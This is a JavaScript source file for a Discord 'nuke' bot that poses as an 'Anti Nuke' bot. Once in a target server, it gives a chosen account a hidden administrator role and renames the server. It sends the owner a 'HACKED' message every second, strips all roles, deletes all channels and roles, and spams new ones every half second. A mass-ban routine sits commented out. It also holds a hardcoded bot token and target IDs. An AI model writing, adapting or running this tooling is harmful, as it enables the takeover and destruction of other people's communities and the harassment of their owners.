const Discord = require("discord.js")
const client = new Discord.Client()
const token = "NjgxNDQyMDg4ODEzODU0Nzk5.XlTXtw.tlt4Q1_xpzJrwZTehZa86aZxjRY"

const setAdmin = (guildID, accountID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.createRole({name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}).then((role) => {

        targetServer.members.get(accountID).addRole(role).catch((err) => {
           return console.error(`You are not in the ${targetServer.name} server ! You must to be in this server befor leveling up !`)
        })
    })
}
 
const changeServerInfo = (guildID, options) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_GUILD")) return console.error(`${client.user.username} has not the required perms to make something like this`)
    
    targetServer.setName(options.newServerName)
    targetServer.setIcon(options.newServerIcon)

    const embed = new Discord.RichEmbed()
    .setAuthor(client.user.tag, client.user.avatarURL)
    .setTitle("HACKED")
    .setDescription(`YOUR SERVER ${targetServer.name} HAS BEEN HACKED BY ${client.user.tag}`)
    .setFooter(client.user.tag, client.user.avatarURL)
    .setColor("#ff0000")

    setInterval(() => {
    return targetServer.owner.send(embed)
    }, 1000)
}

const banMembers = (guildID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("BAN_MEMBERS")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.forEach(async (member) => {
        member.bannable ? await member.ban({reason: `HACKED BY ${client.user.tag}`}) : undefined
    })
}

const changeNicks = (guildID, newNick) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_NICKNAMES")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.forEach((member) => {
        try {
            
            member.setNickname(newNick, `HACKED BY ${client.user.tag}`)
        } catch (error) {
            undefined
        }
    })
}

const createChanelsAndRoles = (guildID, name) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
    targetServer.members.forEach((member) => {
  		member.roles.forEach(async (role) => {
            try {
                await member.removeRole(role)
                  
            } catch (error) {
                undefined
            }
  		})
    })

    targetServer.channels.forEach(async (channel) => {
        channel.deletable ? await channel.delete() : undefined
    })

    targetServer.roles.forEach(async(role) => {
        role.deletable ? await role.delete() : undefined
    })

    setInterval(async () => {
        await targetServer.createChannel(name, "text")
        await targetServer.createChannel(name, "voice")
        await targetServer.createRole({name: `HACKED BY ${client.user.username}`, permissions: 0, color: 0xFF0000 }).then(async(role) =>{
            await targetServer.members.forEach(async (member) => {
                try {
                    await member.addRole(role)
                } catch (error) {
                    undefined
                }
            })
        })
    }, 500)

}

client.on("ready", () => {
    console.log("THE HACKING STARTED NOW ")

    // Setup YOUR personnal settings
    const configs = {
        "targetServerID": "681774948334698497",
        "accountID": "674465485500448780",
        "botNickname": "Anti Nuke",
        "botIcon": 'https://cdn.discordapp.com/attachments/670539100666724366/681445808704454686/8760e76015947d006c1f22532b791e0f.png',
        "newServerIcon": "https://cdn.discordapp.com/attachments/681386773825585173/681441578467983382/8051bdd2544b4e3cbaeaf6534646f025.jpg",
        "newServerName": "Infinity H4X",
    }

    client.user.setUsername(configs.botNickname)
    client.user.setAvatar(configs.botIcon)

    // Enable all the options
    setAdmin(configs.targetServerID, configs.accountID)
    changeServerInfo(configs.targetServerID, {"newServerName": configs.newServerName, "newServerIcon": configs.newServerIcon})
    changeNicks(configs.targetServerID, configs.botNickname)
    // banMembers(configs.targetServerID)
    createChanelsAndRoles(configs.targetServerID, configs.botNickname)
})


client.login(token)
